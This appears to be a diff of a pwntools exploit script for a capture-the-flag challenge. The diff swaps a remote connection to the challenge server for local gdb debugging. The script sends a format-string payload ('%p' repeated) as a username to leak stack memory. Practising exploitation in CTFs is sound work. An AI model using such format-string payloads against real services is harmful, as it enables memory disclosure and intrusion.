@@ -1,14 +1,14 @@
 from pwn import *
 
-# context.log_level = 'debug'
-# context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
 
-# p = gdb.debug('./chall', '''
-#     b main
-#     continue
-# ''')
+p = gdb.debug('./chall', '''
+    b main
+    continue
+''')
 
-p = remote('chall.lac.tf', 31142)
+# p = remote('chall.lac.tf', 31142)
 
 p.sendlineafter(b'username: ', b"%p%p%p%p%p%p%p%p")
 p.sendlineafter(b'password1: ', b"\n")
